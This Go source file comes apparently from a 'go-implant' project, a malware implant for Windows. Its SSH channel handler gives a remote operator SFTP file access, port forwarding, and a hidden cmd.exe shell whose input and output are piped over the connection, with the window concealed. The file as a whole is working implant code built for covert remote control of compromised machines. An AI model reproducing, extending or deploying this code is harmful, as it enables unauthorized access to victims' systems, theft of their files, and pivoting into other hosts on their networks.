// +build windows

package ssh

import (
	"go-implant/client/config"
	"fmt"
	"log"
	"os/exec"
	"syscall"

	"golang.org/x/crypto/ssh"
)

// On windows, only port forward requests are accepted. These are directed to cmd
func handleChannel(newChannel ssh.NewChannel) {

	isSFTP := false                     // variable that tells whether this is a sftp session or not
	isShell := false                    // variable that tells whether this is a shell session or not
	reqData := DirectTcpipOpenRequest{} // struct to hold portforward arguments

	// Since we're handling port forwards, we expect a
	// channel type of "direct-tcpip". The also describes
	// "x11", "session" and "forwarded-tcpip"
	// channel types.
	t := newChannel.ChannelType()
	if t == "session" {
		// sftp session
		isSFTP = true

	} else if t == "direct-tcpip" {
		// port forward or shell

		// get extra data
		err := ssh.Unmarshal(newChannel.ExtraData(), &reqData)
		if err != nil {
			if config.DEBUG {
				log.Print("Got faulty extradata")
			}
			return
		}

		// if destination address is 0.0.0.0 its a shell, otherwise portforward
		if reqData.HostToConnect == "0.0.0.0" {
			isShell = true
		}

	} else {
		newChannel.Reject(ssh.UnknownChannelType, fmt.Sprintf("unknown channel type: %s", t))
		return
	}

	// At this point, we have the opportunity to reject the client's
	// request for another logical connection
	connection, requests, err := newChannel.Accept()
	if err != nil {
		if config.DEBUG {
			log.Printf("Could not accept channel (%s)", err)
		}
		return
	}

	if config.DEBUG {
		log.Print("Channel request accepted")
	}

	// Prepare teardown function
	close := func() {
		connection.Close()
		if config.DEBUG {
			log.Printf("Session closed")
		}
	}

	// in the end, close the connection
	defer close()

	// Sessions have out-of-band requests such as "shell", "pty-req" and "env"
	go func() {
		for req := range requests {

			if config.DEBUG {
				log.Printf("Got pty request %s with payload %s", req.Type, req.Payload)
			}

			if req.WantReply {
				req.Reply(true, nil)
			}
		}
	}()

	// if this is SFTP session, handle it
	if isSFTP {
		defer connection.CloseWrite()

		if config.DEBUG {
			log.Print("Handling sftpd client now")
		}

		handlesftp(connection) // serve sftp session
	} else if isShell {

		if config.DEBUG {
			log.Print("Handling shell client now")
		}

		serveTerminal(connection) // serve shell session
	} else {

		if config.DEBUG {
			log.Print("Handling port forward now")
		}

		ServePortForward(connection, reqData.HostToConnect, int(reqData.PortToConnect))
	}
}

// Function to serve windows cmd to a ssh channel
func serveTerminal(connection ssh.Channel) {

	if config.DEBUG {
		log.Print("Spawning shell now")
	}

	// run cmd on background and connect session to it
	cmd := exec.Command("cmd")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	// stdin doesnt seem to get written to the shell...
	cmd.Stdin = connection
	cmd.Stdout = connection
	cmd.Stderr = connection

	cmd.Run()

	if config.DEBUG {
		log.Printf("Cmd exited. closing connection")
	}
}
